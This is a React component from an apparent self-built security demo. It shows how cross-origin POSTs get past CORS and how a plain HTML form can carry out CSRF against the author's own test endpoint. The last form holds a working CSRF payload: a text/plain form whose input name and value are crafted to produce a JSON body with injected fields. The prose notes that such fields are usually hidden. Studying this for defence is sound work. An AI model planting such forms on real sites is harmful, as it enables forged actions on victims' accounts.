import {
  ButtonsWrapper,
  RectButton,
  RoundButton,
  SectionWrapper,
  StyledForm,
  StyledHr,
  StyledInput,
  TextWrapper,
} from "../styles/misc-styles";

import { baseUrl } from "../constants/constants";
import fetch from "isomorphic-unfetch";
import { useState } from "react";

const cookiesUrl = `${baseUrl}/api/csrf/post-cookies`;

export default function CorsFormBypass() {
  const [formValue, setFormValue] = useState<string | undefined>();
  const [error, setError] = useState<string | undefined>();

  const handleChange = ({ value }: { value: string }) => {
    setFormValue(value);
  };

  const postToOtherDomain = async () => {
    try {
      const res = await (
        await fetch(cookiesUrl, {
          method: "post",
          body: JSON.stringify({
            formValue,
          }),
        })
      ).json();
      console.log(res);
    } catch (error) {
      setError(error.message);
    }
  };

  return (
    <SectionWrapper>
      <h2>POST to other domain</h2>

      <TextWrapper>
        <p>
          We by-pass CORS and POST to <b>{cookiesUrl}</b>.
        </p>
      </TextWrapper>

      <ButtonsWrapper>
        <RoundButton onClick={postToOtherDomain}>
          POST to other domain
        </RoundButton>
      </ButtonsWrapper>
      {error && (
        <>
          <p>Error message: {error}</p>
          <p>Open dev tools console to see CORS error.</p>
        </>
      )}

      <StyledHr />

      <h3>POST with React SPA pattern</h3>

      <TextWrapper>
        <p>
          When submit is clicked we call an onSubmit function that takes the
          input data saved to local state and POSTs it in the request body.
        </p>

        <p>
          The response is blocked by CORS. But, if you have access to the server
          code you can see it accepts the form value in the request body.
        </p>

        <p>
          This method cannot seem to send cookies. So, it by-passes CORS but
          fails at CSRF.
        </p>
      </TextWrapper>

      <StyledForm
        id="form"
        method="post"
        onSubmit={(e) => {
          e.preventDefault();
          postToOtherDomain();
        }}
      >
        <StyledInput
          name="InputName"
          onChange={({ target }) => handleChange(target)}
        />
        <RectButton type="submit">By-pass CORS with form</RectButton>
      </StyledForm>

      <StyledHr />

      <h3>POST with regular HTML form pattern</h3>

      <TextWrapper>
        <p>
          When submit is clicked the `action` attribute on the form handles the
          POST request. This will redirect you to the other domain for now
          because I do not know how to `preventDefault` here yet. Anyway you
          will see that the other domain has accepted the form data as a request
          body. Freaky and pretty neat!
        </p>

        <p>
          Again, the response is blocked by CORS. But, with access to the server
          you can see further that it accepts this request.
        </p>

        <p>This method by-passes CORS and successfully enacts CSRF.</p>

        <p>
          The input field with malicious data is usually hidden with something
          like `display: none`.
        </p>
      </TextWrapper>

      <StyledForm
        id="form"
        method="post"
        action={cookiesUrl}
        encType="text/plain"
      >
        <StyledInput
          name='{"throwAway":"'
          value='", "fakeId":"uWu123", "personality":"a terrible person", "requestedAction":"activate nuclear option!"}'
        />
        <RectButton type="submit">By-pass CORS & do CSRF</RectButton>
      </StyledForm>
    </SectionWrapper>
  );
}
